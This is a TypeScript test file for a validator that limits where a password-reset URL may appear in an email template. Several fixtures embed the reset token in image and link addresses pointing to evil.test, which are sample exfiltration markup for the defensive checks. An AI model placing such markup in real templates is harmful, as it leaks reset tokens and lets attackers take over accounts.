import { sensitivePlacementProblems } from '../sensitive-placement';

const V = 'https://app.test/reset-password?token=a1&tenant=acme';
// How Handlebars writes V into HTML: & and = are entity-escaped
const V_ESCAPED = 'https://app.test/reset-password?token&#x3D;a1&amp;tenant&#x3D;acme';
const values = { resetUrl: V };

describe('sensitivePlacementProblems', () => {
  it('accepts the value as a whole href, even when entity-escaped (&amp; / &#x3D;)', () => {
    const html = `<p>Reset:</p><a href="${V_ESCAPED}" style="color:#fff">Reset password</a>`;

    expect(sensitivePlacementProblems(html, 'Reset your password', values)).toEqual([]);
  });

  it('rejects it inside an img src query string', () => {
    const html = `<a href="${V_ESCAPED}">Reset</a><img src="https://evil.test/p.png?u=${V_ESCAPED}">`;

    expect(sensitivePlacementProblems(html, 'Reset', values)).toEqual(['"resetUrl" may only be used as a link address']);
  });

  it("rejects it inside another link's href (https://evil/?u=…)", () => {
    const html = `<a href="https://evil.test/?u=${V_ESCAPED}">Reset</a>`;

    expect(sensitivePlacementProblems(html, 'Reset', values)).toHaveLength(1);
  });

  it('rejects it as visible text', () => {
    const html = `<a href="${V_ESCAPED}">Reset</a><p>Or paste ${V_ESCAPED}</p>`;

    expect(sensitivePlacementProblems(html, 'Reset', values)).toHaveLength(1);
  });

  it('rejects it in a style attribute', () => {
    const html = `<div style="background:url(${V_ESCAPED})">x</div>`;

    expect(sensitivePlacementProblems(html, 'Reset', values)).toHaveLength(1);
  });

  it('rejects it as the href of something other than a link', () => {
    const html = `<link href="${V_ESCAPED}"><a href="${V_ESCAPED}">Reset</a>`;

    expect(sensitivePlacementProblems(html, 'Reset', values)).toHaveLength(1);
  });

  it('rejects it in a comment', () => {
    expect(sensitivePlacementProblems(`<!-- ${V} -->`, 'Reset', values)).toHaveLength(1);
  });

  it('rejects it in the subject', () => {
    const html = `<a href="${V_ESCAPED}">Reset</a>`;

    expect(sensitivePlacementProblems(html, `Your link: ${V}`, values)).toHaveLength(1);
  });

  it('reports each misused variable once', () => {
    const html = `<img src="https://e.test/?${V}"><img src="https://e.test/?${V}">`;

    expect(sensitivePlacementProblems(html, '', values)).toEqual(['"resetUrl" may only be used as a link address']);
  });

  it('ignores variables whose value is empty', () => {
    expect(sensitivePlacementProblems('<p>anything</p>', 'Subject', { resetUrl: '' })).toEqual([]);
  });
});
